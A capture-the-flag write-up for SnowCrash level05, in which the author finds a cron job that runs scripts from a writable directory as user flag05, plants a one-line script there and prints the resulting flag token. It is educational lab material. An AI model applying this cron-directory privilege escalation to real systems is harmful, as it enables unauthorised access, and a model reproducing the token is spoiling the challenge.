# Level05

# context

when I logged in with user `level05` using ssh, a weird message pops up in the terminal
```
➜  ~ ssh level05@192.168.64.2 -p 4242
	   _____                      _____               _
	  / ____|                    / ____|             | |
	 | (___  _ __   _____      _| |     _ __ __ _ ___| |__
	  \___ \| '_ \ / _ \ \ /\ / / |    | '__/ _` / __| '_ \
	  ____) | | | | (_) \ V  V /| |____| | | (_| \__ \ | | |
	 |_____/|_| |_|\___/ \_/\_/  \_____|_|  \__,_|___/_| |_|

  Good luck & Have fun

          192.168.64.2 fdbc:6e29:8541:c87d:8464:6df7:4868:ca fdbc:6e29:8541:c87d:8e0:7cff:fe0b:efc7
level05@192.168.64.2's password:
You have new mail.
level05@SnowCrash:~$
```

# steps to repreduce

the message give me a hint that there's an email somewhere. so I have to search for it first
```
level05@SnowCrash:~$ find / -name mail 2> /dev/null
/usr/lib/byobu/mail
/var/mail
/var/spool/mail
/rofs/usr/lib/byobu/mail
/rofs/var/mail
/rofs/var/spool/mail
level05@SnowCrash:~$
```

inside the directory `/var/mail/` a file named `level05`:
```
level05@SnowCrash:~$ cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
level05@SnowCrash:~$
```

as mentioned here at [crontab.guru](https://crontab.guru/#*/2_*_*_*_*)
> every 2 min the command `sh /usr/sbin/openarenaserver` is running with user `flag05`.

what's `sh /usr/sbin/openarenaserver` do?

```
level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
level05@SnowCrash:~$
```

as you can see in the file `/usr/sbin/openarenaserver`:
1. Gets all files in directory `/opt/openarenaserver/*`.
2. Set the CPU time limit to 5 Seconds.
3. Run the file that is being processed.
4. Then delete the executed file.

NOTE: `/opt/openarenaserver` is writeable that mean we can create files inside this dir
```
level05@SnowCrash:~$ ls -la /opt/
total 0
drwxr-xr-x  1 root root  60 Jun  5 16:10 .
drwxr-xr-x  1 root root 240 Jun  5 16:10 ..
drwxrwxr-x+ 2 root root  40 Jun  5 16:28 openarenaserver
level05@SnowCrash:~$
```

now if we combain all the information we have:
- there's a corn job running every 2 minute
- then execute all the files in `/opt/openarenaserver` with the permission of user `flag05`
- when execution end the file is deleted

so we can create a file in `/opt/openarenaserver` and wait for 2 min to be executed.

I will create a file in `/opt/openarenaserver/getflag05` this file will execute the command `getflag` and store the result in a file named `/tmp/flag05` so the file can't be deleted and also I can read the file to get the flag

the final command: `echo '/bin/getflag > /tmp/flag05' > /opt/openarenaserver/getflag05`.

then waiting 2 min
```
level05@SnowCrash:~$ cat /tmp/flag05
Check flag.Here is your token : viuaaale9huek52boumoomioc
level05@SnowCrash:~$
```

here's the token.
